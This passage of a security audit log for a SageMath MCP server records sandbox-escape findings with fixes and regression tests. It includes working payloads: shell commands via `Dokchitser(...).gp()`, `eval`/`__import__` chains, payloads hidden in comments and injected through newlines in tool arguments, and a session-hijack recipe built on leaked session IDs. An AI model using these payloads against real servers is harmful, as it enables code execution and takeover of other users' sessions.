`tests/test_security_bypass.py:101-165` and `:1488-1496` all alias *forbidden*
names, which fail because those roots are unreadable; aliasing a *permitted*
root is the untested case.

`unpickle_global` and `sh` are deliberately absent from `forbidden_call_names`,
so the parent rule is their only AST lock, and this removes it. Every forbidden
parent becomes reachable the same way — `cython`, `repl`, `interfaces`,
`temporary_file`, `remote_file`, `explain_pickle`, `edit_module`, `dev_tools`,
`trace`. Only entries that *also* appear in `forbidden_call_names` still fail.

Runtime reachability of `sage` itself is not in doubt: `STARTUP_CODE` is
`from sage.all import *`, `sage` is in neither denylist, and it appears in the
generated `allowlist.py:424` — which is derived post-scrub.

### Suggested fix

Make the exemption value-aware. Compute a set of module-tainted locals during
`_bound_names` — any target bound from an allowlisted `ast.Name`, from a chain
rooted at one, or from a default or iterable containing one — and exclude those
from `caller_owned`. A cheaper stopgap: disable the exemption for the whole
snippet if any RHS reads an allowlisted name that is a module object at runtime.

Note `security.py:1120-1124` is the analogous bare-name exemption and is **not**
part of this bypass — it is correct as written, because `sage` is in
`allowed_names` there too. The bug is solely that `caller_owned` trusts a root
by spelling.

### How to verify

Regression tests for all five aliased spellings above, each failing before the
fix. Belt and braces: add `unpickle_global`, `unpickle_function`,
`unpickle_all` and `sh` to a terminal-segment check (which item 49's fix
supplies), and consider scrubbing `sage.misc.persist.__dict__` the way
`sage.all.__dict__` is scrubbed.

## 53. `Dokchitser(...).gp()` hands back the removed interface — **critical** — DONE

**Verified end to end against real Sage; ran a shell.**

`allowlist.py:90` offers `Dokchitser`. `sage/lfunctions/dokchitser.py` defines:

```python
def gp(self):
    """Return the gp interpreter that is used to implement this Dokchitser L-function."""
    if self.__gp is None:
        self._instantiate_gp()
```

The `Gp` class and the bare name `gp` are both stripped. The method that returns
a live instance is not, `sage.lfunctions.dokchitser` is not in
`_DANGEROUS_SAGE_MODULES`, and `gp` appears in none of
`forbidden_call_names`, `forbidden_attribute_names` or
`forbidden_attribute_only_names` — so the attribute spelling is unguarded.

```
ALLOWED : L = Dokchitser(conductor=1, gammaV=[0], weight=1, eps=1)
          L.gp()('system("id")')
BLOCKED : gp('system("id")')     # by the allowlist, not by any name rule
```

Constructing succeeds without gp present; `.gp()` then spawns it and returns a
`sage.interfaces.gp.Gp`. Through the real worker: `{"ok": true, "result": "0"}`,
marker written as `uid=1001(sage)`. This file already records
`gp('system("id > /tmp/x")')` writing a file as the container user — this hands
back the identical object.

**One correction to the original report.** `EllipticCurve("389a").lseries()
.dokchitser()` does *not* work on 10.9 — it returns a
`sage.lfunctions.pari.LFunction`, which has no `.gp`, and `algorithm='gp'`
raises `ValueError: algorithm must be "pari" or "magma"`. The direct
construction is the real vector and is sufficient.

### Suggested fix

Add `sage.lfunctions.dokchitser` to `_DANGEROUS_SAGE_MODULES` and regenerate.
Additionally add `gp` to `forbidden_attribute_names`, so `.gp()` is refused
wherever it appears — the `ast.Attribute` check at `security.py:1136-1141`
already has the right shape.

### How to verify

A bypass test on the direct construction. Then the sweep this implies, which is
the general finding: **stripping interface names does not strip methods that
return interface instances.** Grep the installed Sage for methods returning any
stripped `sage.interfaces.*` class. This is item 47's failure mode displaced
from names to methods, and `Dokchitser.gp` is unlikely to be the only one.

## 54. The fragment gate accepts bare `eval` — **critical** — DONE

**Verified against the real gate; the `sage_eval` globals half is asserted by
this repo's own comments rather than executed locally.**

Item 46's second pass removed `eval` from `forbidden_call_names` (commit
`b38b7ee`), on a three-lock argument recorded at `security.py:123-139`: the bare
identifier is *"absent from the restricted builtins, from the worker namespace
and from the generated allowlist, all three."*

**All three are locks on the caller-code path. None of them is the fragment
path.**

1. `codegen.py:69` is `_FRAGMENT_POLICY = replace(SECURITY_POLICY,
   enforce_name_allowlist=False)`. The allowlist is off by construction.
2. The fragment is never executed in the worker namespace. It goes to
   `sage_eval`, which resolves against `sage.all.__dict__` — stated twice in
   this repo, at `codegen.py:116-117` and `_sage_worker.py:376-378`, and it is
   the premise of item 48.
3. `_restricted_builtins()` is installed only as `ns["__builtins__"]`
   (`_sage_worker.py:71`). Nothing ever replaces `sage.all.__dict__["__builtins__"]`.

`_names_the_scrub_removes()` — the denylist that is supposed to be the fragment
path's substitute for the allowlist — does not contain `eval`. So:

```
PASS   eval('__import__("os").system("id > /tmp/pwned")')
PASS   eval('1+1')      PASS  input()      PASS  vars(1)      PASS  locals()
BLOCK  open(...)   BLOCK exec(...)   BLOCK __import__(...)   BLOCK compile(...)
eval in forbidden_call_names: False | in scrub set: False | in ALLOWED_CALLER_NAMES: False
```

And the assembled snippet passes trusted validation, because the payload is an
`ast.Constant` string there:

```
_expr = sage_eval("eval('__import__(\"os\").system(\"id > /tmp/pwned\")')", locals=_locals)
```

`_SymbolLocals.__missing__` raises `KeyError` for a four-character name, so
lookup falls through to globals and builtins. Even in the worst case where
`sage.all.__dict__` lacked `__builtins__`, CPython's `eval` injects the real
builtins — confirmed with a standalone probe. `__import__` is deliberately
retained (`_sage_worker.py:500-506`), supplying stage two.

**The blind spot is in the tests, not just the code.** Every `eval`-blocking
assertion passes `SECURITY_POLICY` explicitly —
`tests/test_security_bypass.py:849`, `:1380`,
`tests/test_generated_code_lint.py:225-250`. Not one exercises
`_validated_expression` or `_FRAGMENT_POLICY` with `eval`.

Reachable through every tool that routes a string via
`_encode_literal`/`_validated_expression` — 64 call sites across `tools/`:
`calculate_expression`, `simplify_expression`, `factor_expression`,
`differentiate_expression`, `integrate_expression`, `solve_equation`,
`plot_expression` and the rest.

### Suggested fix

Restore the evaluation primitives on the fragment policy specifically. They are
exactly the names whose "reaches nothing" argument does not survive with the
allowlist off:

```python
_FRAGMENT_POLICY = replace(
    SECURITY_POLICY,
    enforce_name_allowlist=False,
    forbidden_call_names=SECURITY_POLICY.forbidden_call_names
        + ("eval", "vars", "locals", "input"),
)
```

This closes the unparseable path for free, since `_screen_unparseable_fragment`
already reads `_FRAGMENT_POLICY.forbidden_call_names`.

Also fix the stale claims that `_validated_expression` "enforces the allowlist"
(`_sage_worker.py:421`, `tests/test_security_bypass.py:2009`). That drift is the
root cause — item 48 relied on it in writing.

### How to verify

`test_the_attribute_only_names_are_still_shut_where_they_bite`, parameterised
over `_FRAGMENT_POLICY` rather than `SECURITY_POLICY`. Verify against real Sage.

## 55. A comment becomes code when the template splits on `=` — **critical** — DONE

**Verified against the real gate; the `__import__` half is recorded as verified
against real Sage under item 18.**

The gate validates the whole string with `ast.parse`, which discards everything
after `#`. The generated trusted snippet then splits that same string at runtime
and hands each half to `sage_eval` separately — at which point the commented
text is no longer a comment. It is the right-hand operand.

`tools/algebra.py:59-66`:

```
for _eq_str in {_encode_literal(equations)}:
    parts = _eq_str.split('=')
    if len(parts) == 2:
        left = sage_eval(parts[0].strip(), locals=_locals)
        right = sage_eval(parts[1].strip(), locals=_locals)
```

`tools/calculus.py:201-206` is the identical shape on `_ode_text`,
unconditional. `tools/core.py:329-337` does it in the `except SyntaxError:`
branch of the whole-string `sage_eval`.

Gate run:

```
ACCEPTED: 1 # eval("x") = __import__("os").system("id > /tmp/pwned")
   encoded: "1 # eval(\"x\") = __import__(\"os\").system(\"id > /tmp/pwned\")"
   split -> ['1 # eval("x")', '__import__("os").system("id > /tmp/pwned")']
```

`_normalize_source` only collapses whitespace, so `#` survives encoding. There
is no comment stripping and no `#` rejection anywhere in `codegen.py`.

**The unparseable path leaks the same way**, which makes `find_root` reachable
too: `_screen_unparseable_fragment` screens `tokenize` NAME tokens, and a
comment is a `COMMENT` token, so it is never inspected:

```
ACCEPTED '1 if else # = __import__("os").system("id")'
   split -> ['1 if else #', '__import__("os").system("id")']
```

That string does raise `SyntaxError` from the whole-string `sage_eval`, so it
reaches `find_root`'s split branch. All three sites are live.

`__import__` is blocked on the ordinary path — `validate_code('__import__("os")
.system("id")')` raises `Call to forbidden function '__import__' is blocked` —
so this is a genuine escalation, not an already-available capability.
`_sage_worker.py:498-506` says it outright: *"The defence against item 18 is
therefore the validation gate on every string that reaches a trusted template,
not the namespace backstop, which cannot cover this name."* This is a hole in
that gate.

No test covers it. `grep -rn -i comment tests/` finds only
`test_math_coverage.py:384`, a *functional* test asserting comments still
evaluate.

### Suggested fix

Do the `=` split at **gate time**, in `codegen.py`, and validate each half
independently before encoding, so the runtime snippet receives pre-validated
halves instead of re-deriving them.

Additionally reject `tokenize.COMMENT` tokens outright in both
`_validated_expression` and `_screen_unparseable_fragment`. A mathematical
fragment has no legitimate use for `#`, and per-half revalidation alone stays
fragile against the next runtime transform someone adds.

### How to verify

Regression tests for the parseable and unparseable comment variants on all three
tools:

```
solve_equation(equation='1 # eval("x") = __import__("os").system("id > /tmp/pwned")', variable="x")
solve_ode(equation='1 # y = __import__("os").system("id")')
find_root(expression='1 if else # = __import__("os").system("id")')
```

## 56. Unparseable fragments are returned verbatim into statement position — **critical** — DONE

**Verified against the real gate and by assembling the real snippets; the
file-write half is inferred.**

`codegen.py:197-215`: when `ast.parse(..., mode="eval")` raises and the `=`→`==`
rewrite also fails, `_screen_unparseable_fragment(stripped)` runs and the
function does `return text` — the **original, unstripped, unnormalized** string.
`_normalize_source`, which would collapse the newline and kill this, is applied
only inside `_encode_literal`, never on this return path.

The token screen at `:137-146` builds its forbidden set from exactly:

```python
set(_FRAGMENT_POLICY.forbidden_call_names)
| set(_FRAGMENT_POLICY.forbidden_attribute_parents)
| _names_the_scrub_removes()
```

plus a dunder check. It never consults `forbidden_attribute_prefixes`
(`security.py:269`, `("save","dump","export","write")`), which `trusted_policy()`
deliberately clears (`security.py:622`). It also never runs
`_refuse_scrubbed_names`, so the `sage`-module-root backstop added in `239d6d6`
(`codegen.py:101-105`) is bypassed on this path as well.

A fragment with a newline is unparseable as an expression and perfectly valid as
two statements once interpolated. `_sage_prelude()` is dedented and ends at
column 0, so the fragment lands at column 0 — no `IndentationError`:

```
_locals = _SymbolLocals({name: var(name) for name in ['x', 'y', 'z', 't']})
_G = SymmetricGroup(5)
_zz = plot(sin(x)).matplotlib().savefig('/home/sage/.sage/init.sage')
int(_G.order())
```

`ast.parse` OK, 7 top-level statements, and `validate_module(..., policy=
trusted_policy())` **passes**.

**Three sinks, not two.** `group_operation` (`discrete.py:271`) and
`coding_theory_operation` (`discrete.py:378`) interpolate at statement position
directly. `graph_operation` (`discrete.py:191,197`) is a third, via a different
route: `_NAMED_GRAPH_RE` (`codegen.py:249`) uses `re.DOTALL`, so `\(.*\)`
greedily swallows the newline and the injected statement whenever the fragment
ends in `)`:

```
graph="PetersenGraph()\n_zz = plot(sin(x)).matplotlib().savefig('/tmp/pwn.png')"
-> _G = graphs.PetersenGraph()
   _zz = plot(sin(x)).matplotlib().savefig('/tmp/pwn.png')
```

Assembled: parses, 7 statements, trusted validation passes.

`polynomial_ring_operation` (`algebra.py:297`) is **not** vulnerable — confirmed.
It interpolates inside `PolynomialRing(...)`, where a newline is only a
continuation; three breakout attempts were rejected at the gate with
`tokenize.TokenError`, and the one fragment that passed produced a
`SyntaxError` when assembled.

**Why the fallback exists, and why fixing it costs nothing.** It is there for
Sage-only syntax the Python parser rejects: the generator form `R.<a,b> = QQ[]`
(`tests/test_codegen.py:191`) and the documented equation form `x^2 - 1 = 0`
(handled by the `=`→`==` rewrite). Neither contains a newline.

**On impact, stated honestly.** The immediate primitive is an arbitrary-path
file write as the worker user — `savefig`, `save_image`, `write_to_eps` all pass
the gate and trusted validation with a caller-chosen path. Bare `save`, `load`,
`dumps`, `open`, `sage_eval` and `__import__` are correctly blocked by the token
screen. The `init.sage` persistence angle is weaker than it first looks:
`docker-compose.yml:20-23` and `charts/sagemath-mcp/values.yaml:38,45-49` mount
tmpfs/emptyDir at `/tmp` and `/home/sage/.sage`, so the path is writable but not
restart-persistent, and the content would be PNG bytes rather than Python. The
default stdio deployment is uncontainerized with a fully writable home. The core
issue is not the file write: it is **arbitrary statement execution under
`trusted_policy()`**, strictly wider than the single expression the tool
contract promises, including unrestricted `sage.*` tree traversal
(`_z = sage.features.Executable('sh','sh').absolute_filename()` passes, because
the `sage`-root backstop does not run on this path).

The namespace-poisoning escalation is closed: `_sage_worker.py:395-399,869-884`
removes trusted-introduced names from `_CALLER_BOUND_NAMES` on every trusted
call.

No test covers it. `tests/test_security_bypass.py:216`, `:1961-1990` and
`tests/test_codegen.py:184-191` exercise the unparseable path only with
single-line payloads.

### Suggested fix

One line that breaks nothing: reject any fragment containing a newline in
`_validated_expression` before attempting the parse — or apply
`_normalize_source(text)` to the fragment, which is what `_encode_literal`
already does and whose docstring (`codegen.py:40-48`) states the exact
rationale: *"Every tool here evaluates its input as a single expression, so an
embedded newline is a syntax error."* Both documented unparseable forms are
single-line, so nothing legitimate regresses.

Also make `_screen_unparseable_fragment` consult `forbidden_attribute_prefixes`
and apply the same `sage`-root refusal as `_refuse_scrubbed_names`, and drop
`re.DOTALL` from `_NAMED_GRAPH_RE`.

### How to verify

Regression tests on all three sinks, including the `graph_operation` variant
that the first pass of this review wrongly cleared:

```
group_operation(group="SymmetricGroup(5)\n_zz = plot(sin(x)).save_image('/tmp/pwn.png')",
                operation="order")
graph_operation(graph="PetersenGraph()\n_zz = graphs.PetersenGraph().write_to_eps('/tmp/pwn.eps')",
                operation="order")
```

Assert `polynomial_ring_operation` stays refused, so the fix is not over-fitted.

## 57. The session resource publishes every live MCP session ID — high — DONE

**Verified by reading the installed MCP SDK.**

`tools/session.py:145-164`:

```python
@mcp.resource("resource://sagemath/session/{scope}")
async def session_resource(scope: str, ctx: Context | None = None) -> str:
    """Expose a resource describing active Sage sessions for observability."""
    import json as _json

    del ctx  # resource does not require request context
    data = runtime.SESSION_MANAGER.snapshot()
    if scope != "all":
        data = [entry for entry in data if entry["session_id"] == scope]
```

`ctx` is discarded before use, so the caller's identity never enters the query.
`scope == "all"` returns the whole global map. `snapshot()`
(`session.py:813-824`) emits the manager key verbatim, and `key_for()`
(`session.py:680-688`) returns the bare scope for a default workspace — which is
literally the client's `Mcp-Session-Id` (FastMCP's `Context.session_id` is
`request.headers.get("mcp-session-id")`). Named workspaces leak it too, since
`scope::name` still contains the UUID.

The sibling tool `list_sage_sessions` (`tools/session.py:122-127`) scopes
correctly via `list_for_scope(ctx.session_id)`, so the omission is inconsistent
with the file's own pattern rather than a considered decision.

**The load-bearing link holds.** `mcp/server/streamable_http_manager.py:252-280`
in the installed SDK:

```python
user = scope.get("user")
requestor = authorization_context(user) if isinstance(user, AuthenticatedUser) else None

if request_mcp_session_id is not None and request_mcp_session_id in self._server_instances:
    transport = self._server_instances[request_mcp_session_id]
    if requestor != self._session_owners.get(request_mcp_session_id):
        ... 404 "Session not found" ...
    await transport.handle_request(scope, receive, send)
```

Session creation only records an owner `if requestor is not None`. Unauthenticated,
both sides are `None`, `None != None` is `False`, and the request is dispatched
into the victim's transport. `_server_instances` is a plain dict keyed solely on
the header value; there is no transport or connection binding. **The only
protection for a session is the unguessability of its ID**, and this resource
publishes it.

`fastmcp/server/http.py:43` subclasses the SDK manager and overrides only
`event_store`; `_handle_stateful_request` is inherited unmodified, and
`stateless_http` defaults to `False`.

Exposure is the shipped HTTP deployment: the `Dockerfile` CMD is
`["--transport", "streamable-http", "--host", "0.0.0.0", "--port", "8314"]`, and
`charts/sagemath-mcp/templates/deployment.yaml` runs that image with `args: []`
behind a Service. The CLI default is stdio (single client, unaffected), and
compose binds `127.0.0.1`, which limits the network but not multi-client access
on the host.

Attack: open a session, read `resource://sagemath/session/all`, take a victim
UUID, send `POST /mcp` with `Mcp-Session-Id: <victim>`, then `evaluate_sage`
inside their persistent namespace — reading their variables, overwriting
results, or destroying state with `reset_sage_session`.

This is the property item 10 was about. `app.py:106-120` disabled response
caching because *"a state-dependent expression can return another client's
value"*; this defeats the same property more directly.

**Pre-existing, moved in range.** `git log -S 'entry["session_id"] == scope'`
gives `93e016b` (initial commit) and `d8e3a4c` (the `tools/` split), the latter
inside this range.

### Suggested fix

Scope the resource to its caller, as every other tool in the file does: require
`ctx` and `ctx.session_id`, filter `snapshot()` by
`split_key(key)[0] == ctx.session_id` (or reuse `list_for_scope`), and emit the
workspace **name** rather than the raw key so session IDs never cross the wire.
Treat `scope == "all"` as "all of *my* workspaces". `/health` already covers the
"how many sessions" observability need without naming them.

Defence in depth: derive the manager key from an HMAC of `ctx.session_id`, so a
leaked key is not a usable header value.

### How to verify

A test asserting the resource returns only the caller's own sessions given two
distinct `ctx.session_id` values, and that no raw `Mcp-Session-Id` appears in
the payload. Review `monitoring_resource` at the same time — it has the same
`del ctx` shape (see below).

## Reported and not carried

Three candidates were raised and dropped. Recorded so the next review does not
re-litigate them.

**Global monitoring metrics leak** — `tools/session.py:167-174`. The chain is
accurate and I am not disputing the mechanics: `_METRICS` is a process-global
singleton (`monitoring.py:52`), `monitoring_resource` does `del ctx` with no
scoping, `core.py:137` and `:393` pass `details=exc.traceback or exc.stdout`,
and the `KeyboardInterrupt` path at `_sage_worker.py:841-854` really does return
`traceback: ""` with populated stdout — so an interrupted evaluation puts
another client's full, untruncated stdout into a globally readable field
(`_truncate_stdout` is applied only on the success path). But the data is CAS
output and exception text, not secrets or PII; only one value survives before
the next failure overwrites it; `README.md:798` documents it as part of the
resource contract; and `monitoring.py` is untouched across this range. **Low,
not medium.** Worth doing with item 57 — deleting the `del ctx` at
`session.py:170` is the same fix — but not a finding on its own.

**Reconsidered and carried as item 58 (below).** In a multi-client server one
client's computation output is that client's data, so exposing it to another
client is a cross-tenant break of the same class as item 57, not mere logging of
sensitive-ish data — medium, and now fixed. The fix redacts the free-text fields
rather than deleting `del ctx`, since the metrics are process-wide aggregates
with no per-caller view to scope to.

**Unpinned GitHub Actions in the release jobs** — `release.yml:126` and the
`docker/*` actions. Every attack path starts with compromising PyPA-, Docker- or
Sigstore-owned repositories. No actor can exploit it today; the jobs run only on
a tag push or dispatch by someone with write access, who could edit the workflow
directly anyway. Pinning to full commit SHAs is a good hardening ticket and not
a vulnerability.

**`mcp-publisher` downloaded from `releases/latest`** — `release.yml:154-157`,
new in this range. More defensible than the above: pinned to nothing at all, no
checksum or signature, piped into `tar xz` and executed, then handed the repo's
OIDC identity. But the precondition is still a third-party compromise, transport
integrity rests on HTTPS with `curl -f`, and the job holds only `id-token: write`
scoped to the MCP registry. Pin the release and verify a published checksum, but
it is not a reportable vulnerability.

Also noted while reading, not findings: `release.yml:10-15` declares a `dry_run`
input that is never read — the publish gate is
`startsWith(github.ref, 'refs/tags/v')`, so dispatching against an existing tag
with `dry_run: true` really publishes. A maintainer footgun, not an untrusted-actor
issue. And `scripts/generate_denylist.py:52-70` splices whitespace-split tokens
from a predictable `/tmp` path into `_sage_worker.py` as `"{name}",` with no
escaping; only reachable by a local attacker pre-creating the file on a shared
dev machine, but `mktemp` plus a `^[A-Za-z_][A-Za-z0-9_]*$` check on each token
is nearly free.

---

## Items 49-57, resolved (2026-08-16)

All nine fixed, written test-first, and verified against real SageMath 10.9 in
the `sage-mcp` container: the twelve escape payloads that ran a shell (or would
have) now return `ok=False` with no marker file written, and the mathematics
they collided with still computes.

Shipped in PR #40 (squash-merged to `main` as `69221b4`). Full verification:
host suite 830 passed; the complete container suite 972 passed (1 skipped, the
opt-in doctest-execution run, which passes when enabled); coverage 100%
(statements and branches); the denylist drift test and every math-coverage
counterweight green; and all seven CI checks -- lint, security, test 3.12/3.13,
smoke, helm, integration -- passed on the PR. Regenerating the allowlist removed
exactly five names (`Pari`, `PariRing`, `PariGroup`, `libgap`, `Dokchitser`) and
kept `PariError`, and `tests/test_sage_doctest_corpus.py` no longer asserts
`libgap(5).Factorial()` works -- `factorial(5)` and the group methods cover it.

**49 + 52 -- one rule, `security.py`.** The attribute-chain check now inspects
every segment, not `segments[:-1]`. A forbidden name in **terminal** position is
refused when the chain is a module path -- rooted (len >= 2) at an offered name
-- so `m = sage.env.os`, `desolvers.os`, `sage.env.sys.modules['os']` and the
`f = sage.misc.persist` / `sage.misc.trace` extractions are all blocked at the
binding. A plain two-segment `object.method` is left alone through
`_TERMINAL_METHOD_NAMES = {trace, sh, operator, pari, oeis}`, so `A.trace()`,
`(x+y).operator()` and `E.pari()` still work. The `caller_owned` exemption now
covers the **root** segment only, so `sh = 2; sh.bit_length()` is still
arithmetic while `s = sage; s.misc.persist.unpickle_global(...)` is refused at
`persist` -- the deeper forbidden parent is an attribute of a real object, not
the caller's rebinding. Regression tests: `test_a_terminal_module_cannot_be_
extracted_from_a_module_path`, `test_aliasing_sage_does_not_exempt_a_deeper_
forbidden_parent`, `test_a_rebound_forbidden_parent_name_is_still_arithmetic`,
`test_a_real_method_named_like_a_forbidden_parent_is_left_alone`.

**50 + 51 + 53 -- provenance, `_sage_worker.py`.** Four modules added to
`_DANGEROUS_SAGE_MODULES` and the baked list + allowlist regenerated (`make
denylist`, `make allowlist`): `sage.rings.pari_ring` and `sage.groups.pari_
group` (remove `Pari`, `PariRing`, `PariGroup` -- constructors that funnel a
string into the module-level `pari` reference the bare name could not reach);
`sage.libs.gap.libgap` (removes `libgap`, the in-process GAP interface that
answered to `Exec` and `function_factory`); `sage.lfunctions.dokchitser`
(removes `Dokchitser`, whose `.gp()` returned the GP interpreter). Exactly five
names left the allowlist, `PariError` correctly kept. The refusal text in
`_NATIVE_EQUIVALENTS` no longer recommends `libgap(...)`. For 53, `gp` was also
added to `forbidden_attribute_names`, so `.gp()` is refused wherever it appears.
`tests/test_sage_doctest_corpus.py` no longer asserts `libgap(5).Factorial()`
works -- the mathematics is `factorial(5)` and the group methods, which do.
Regression: `test_names_that_reconstruct_a_removed_capability_are_refused`,
`test_the_gp_interface_method_is_refused`.

**54 -- fragment policy, `codegen.py`.** `_FRAGMENT_POLICY` re-adds `eval`,
`vars`, `locals` and `input` to `forbidden_call_names`. On the tool path the
allowlist is off and the fragment is handed to `sage_eval`, which resolves in
`sage.all`'s globals where the real builtins live, so the "reaches nothing"
argument that freed them on the caller path does not hold -- `eval('...')` and
`locals()["__builtins__"]["eval"]` both reached RCE. They affect fragments only;
no tool fragment calls `.vars()`/`.locals()`. Regression:
`test_the_fragment_gate_refuses_the_evaluation_primitives`.

**55 + 56 -- the fragment gate, `codegen.py`.** `_validated_expression` now folds
whitespace (so a newline can never survive into a template that interpolates the
fragment verbatim) and returns the folded text, and `_reject_statement_
smuggling` refuses any comment or `;`. A comment hid a payload from `ast.parse`
that the runtime `.split('=')` revived (55); a newline or `;` turned one
interpolation slot into two statements (56). With newlines folded and `;`
refused, the only remaining shape is juxtaposition, which is a syntax error the
worker rejects -- confirmed end to end for `group_operation`, `graph_operation`
and `coding_theory_operation`, no file written. `re.DOTALL` dropped from
`_NAMED_GRAPH_RE` as defence in depth. A wrapped single expression (`"2 +\n2"`)
still passes, folded. Regression: `test_a_comment_cannot_hide_a_payload_from_
the_split`, `test_a_semicolon_cannot_smuggle_a_statement`, `test_a_newline_is_
folded_out_so_it_cannot_break_a_statement`, `test_an_untokenizable_fragment_is_
still_rejected`.

**57 -- the session resource, `tools/session.py`.** `session_resource` is scoped
to its caller: it requires the request context, returns only the sessions whose
key is rooted at `ctx.session_id`, and reports the workspace **name** rather than
the raw key, so no `Mcp-Session-Id` crosses the wire and `{scope}` selects a
workspace within the caller's own sessions. It fails closed -- no context, no
output -- and `/health` still gives operators the aggregate count. `monitoring_
resource` carries the same `del ctx` shape and the same aggregate-only,
cross-tenant concern noted under "Reported and not carried"; it is a narrower
(LOW) leak and is left for a follow-up. Regression: `test_session_resource_all_
is_scoped_to_the_caller`, `test_session_resource_filters_by_workspace_name`,
`test_session_resource_cannot_read_another_clients_scope`, `test_session_
resource_without_context_returns_nothing`.

## 58. The monitoring resource publishes another client's error text and stdout — medium — DONE

**The follow-up item 57 deferred, now carried.** Item 57 scoped
`session_resource` but left its sibling `monitoring_resource`
(`tools/session.py:187-194`) with the same `del ctx` shape, filed under
"Reported and not carried" as LOW on the reasoning that the exposed data is
"CAS output and exception text, not secrets or PII." That reasoning does not
hold in a multi-client server: a client's computation output *is* that client's
data, so exposing it to another client is a cross-tenant confidentiality break
of the same class as item 57 -- narrower (one failing evaluation at a time, not
full namespace takeover), hence **medium**, but real.

**Mechanism.** `monitoring_resource` discarded `ctx` and returned the
process-global `_METRICS` snapshot verbatim, including three free-text fields:
`last_error`, `last_security_violation` and `last_error_details`. On the failure
path (`tools/core.py:134-137`, and the streaming path `:390-393`),
`record_failure` is called with `details=exc.traceback or exc.stdout`, where
`exc.stdout` is the **untruncated** stdout of the failing computation
(`_truncate_stdout` runs only on the success path, `core.py:164`); on an
interrupt the worker returns `traceback == ""`, so `details` is the stdout
outright. `last_error` and `last_security_violation` likewise carry the failing
client's error message and rejected code. `_METRICS` is a single
process-global singleton (`monitoring.py:52`), so any client reading
`resource://sagemath/monitoring/metrics` (or `/all`) saw the most recent failing
evaluation's text from *any* client.

**Exposure.** The shipped HTTP deployment (`Dockerfile` CMD `--transport
streamable-http --host 0.0.0.0 --port 8314`, `stateless_http=False`,
unauthenticated) dispatches every client, and unlike item 57 no session-id
guess is needed -- the resource is global. Attack: victim runs a computation
that prints sensitive intermediate values and then fails (or is interrupted);
attacker reads the monitoring resource and recovers the victim's stdout, error
message and rejected code. This is the same confidentiality property response
caching was disabled to protect (`app.py:106-114`).

### Fix

`monitoring.py` gains `public_snapshot()`, which drops the three free-text
fields (`_CLIENT_TEXT_FIELDS`) from the snapshot; the fields remain on the
internal `EvaluationMetrics`/`snapshot()` for server-side logging. The public
`MonitoringSnapshot` model (`models.py`) no longer *declares* those fields, so
the leak cannot reappear by re-widening a dict -- the type has nowhere to put
the text. `monitoring_resource` now emits `MonitoringSnapshot(**public_
snapshot())`; only non-identifying aggregate counters and latencies cross the
wire, so the resource is safe unscoped and `ctx` genuinely is not needed.

### How to verify

Two real MCP clients: the victim triggers a failure whose error text carries a
marker, the attacker reads the resource, and the marker must not appear in the
payload (while the internal `snapshot()` still records it, proving the leak path
was exercised). Regression: `test_monitoring_resource_does_not_leak_one_clients_
error_to_another` (`tests/test_cache_isolation.py`); `test_monitoring_resource_
tracks_metrics` (`tests/test_server.py`) updated to assert the free-text fields
are absent from the resource but present on the internal record.

### Status

Fixed in the working tree. Host suite green (`SAGEMATH_MCP_PURE_PYTHON=1`):
848 passed, coverage 100% (statements and branches), lint clean. Not yet
verified against real Sage in the container or committed.
